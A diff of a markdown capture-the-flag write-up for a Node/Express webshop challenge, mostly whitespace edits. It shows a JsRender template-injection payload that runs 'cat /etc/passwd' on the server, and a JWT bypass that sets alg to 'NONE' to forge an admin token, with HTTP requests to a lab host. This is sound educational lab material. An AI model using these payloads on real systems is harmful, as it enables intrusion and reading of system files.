@@ -12,43 +12,36 @@ Your ultimate challenge is to shut down the parasitic alien vessels and save hum
 
 ![](/images/didactic-source-tree.png)
 
+The challenge begins with a login prompt.  
 
-The challenge begins with a login prompt.
 ![](/images/didactic-login.png)
 
-While looking at the routes defined in the `index.js` file, we stumble upon a `/register` route that let's us create a user.
+While looking at the routes defined in the `index.js` file, we stumble upon a `/register` route that let's us create a user.  
 
 ![](/images/didactic-register.png)
 
-We create a user.
+We create a user.  
 
 ![](/images/didactic-user-created.png)
 
-We can then login and see the store:
+We can then login and see the store:  
 
 ![](/images/didactic-webshop.png)
 
-It seems like they're selling litteral paddles.
-It is a webshop.
+It seems like they're selling litteral paddles.  
+It is a webshop.  
 
 ##### Obtaning RCE
 
-There is an admin page at `/admin`, this page seems to list the existing users.
+There is an admin page at `/admin`, this page seems to list the existing users.  
 
-Here is the code of the `admin.jsrender` file:
+Here is the code of the `admin.jsrender` file:  
+
 ```html
 <!DOCTYPE html>
 <html lang="en">
 
-<head>
-  <meta charset="UTF-8" />
-  <title>Admin Dashboard</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="icon" href="/stat/images/favicon.png" />
-  <link href="https://cdn.jsdelivr.net/npm/bootswatch@5.2.3/dist/cerulean/bootstrap.min.css" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" type="text/css" href="/static/css/main.css" />
-</head>
+	<!--- //snip // --->
 
 <body>
   <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
@@ -66,7 +59,7 @@ Here is the code of the `admin.jsrender` file:
 </html>
 ```
 
-Here is the code for the `/admin` route.
+Here is the code for the `/admin` route.  
 
 ```javascript
     router.get("/admin", AdminMiddleware, async (req, res) => {
@@ -84,9 +77,9 @@ Here is the code for the `/admin` route.
     });
 ```
 
-There is actually an SSTI vulnerability here.
-The `jsrender.templates` function templates the given string.
-This can actually lead to RCE as detailed in this article:
+There is actually an SSTI vulnerability here.  
+The `jsrender.templates` function templates the given string.  
+This can actually lead to RCE as detailed in this article:  
 
 - https://appcheck-ng.com/template-injection-jsrender-jsviews
 - https://www.jsviews.com/#htmltag
@@ -108,20 +101,21 @@ Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5MTQ
 {"username":"{{:7*7}}","password":"gh0st"}
 ```
 
-This request will cause 49 to appear on the admin's page.
-Now, one question arises, is admin a bot or do we have to elevate ?
+This request will cause 49 to appear on the admin's page.  
+Now, one question arises, is admin a bot or do we have to elevate ?  
 
 ```javascript
 {{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
 ```
 
-This works, it gets RCE on my local instance.
-Now time to figure out the admin situation.
+This works, it gets RCE on my local instance.  
+Now time to figure out the admin situation.  
 
 ##### Obtaining Admin
 
-While reading the source for `AdminMiddleware.js`, I found a weird condition on the JWT's `alg` value.
-Here is the condition:
+While reading the source for `AdminMiddleware.js`, I found a weird condition on the JWT's `alg` value.  
+Here is the condition:  
+
 ```javascript
 // alg == none --> Login
 // alg == HS256 --> decode with secret
@@ -156,33 +150,35 @@ Here is the condition:
     }
 ```
 
-Maybe I can dodge signature validation ?
+Maybe I can dodge signature validation ?  
 
-Something like a default value for it, or specifying an unsafe algorithm.
+Something like a default value for it, or specifying an unsafe algorithm.  
 
-While tinkering with this condition locally, I found an authentication bypass.
+While tinkering with this condition locally, I found an authentication bypass.  
 
-The condition is that the `decoded.header.alg` value equals the string `'none'`.
-There could be a way to bypass this, if the underlying library normalizes the `alg` values coming in the `verify` function.
+The condition is that the `decoded.header.alg` value equals the string `'none'`.  
+There could be a way to bypass this, if the underlying library normalizes the `alg` values coming in the `verify` function.  
 
-This is how we bypass it, we simply specify the `alg` as `'NONE'` instead.
-This goes through to the `else`, which decodes the value and treats the token as valid.
+This is how we bypass it, we simply specify the `alg` as `'NONE'` instead.  
+This goes through to the `else`, which decodes the value and treats the token as valid.  
 
-Using this, we can craft an administrator token.
+Using this, we can craft an administrator token.  
 
-Here is our JWT:
+Here is our JWT:  
+
 ```json
 {"alg":"NONE","typ":"JWT"}{"id":1,"iat":1679153124,"exp":1679156724}
 ```
-`alg`: `"NONE"` will bypass the condition.
-`id`: 1 represents the administrator user.
 
-We encode it:
+`alg`: `"NONE"` will bypass the condition.  
+`id`: 1 represents the administrator user.  
+
+We encode it: 
 ```
 eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MTUzMTI0LCJleHAiOjE2NzkxNTY3MjR9.
 ```
 
-HERE WE GOOOOO :
+HERE WE GOOOOO:
 ```http
 GET /admin HTTP/1.1
 Host: 10.18.232.1:1337
@@ -195,7 +191,7 @@ Cookie: session=eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MTUz
 Upgrade-Insecure-Requests: 1
 
 ```
-
+  
 ```http
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -209,9 +205,7 @@ Connection: close
 //snip //
 ```
 
-Now that we can visit the admin page, we can put it all together and create a malicious user to extract the flag.
-
-The below script automates this process.
+Now that we can visit the admin page, we put it all together and create a malicious user to extract the flag.  
 
 #### Script
 
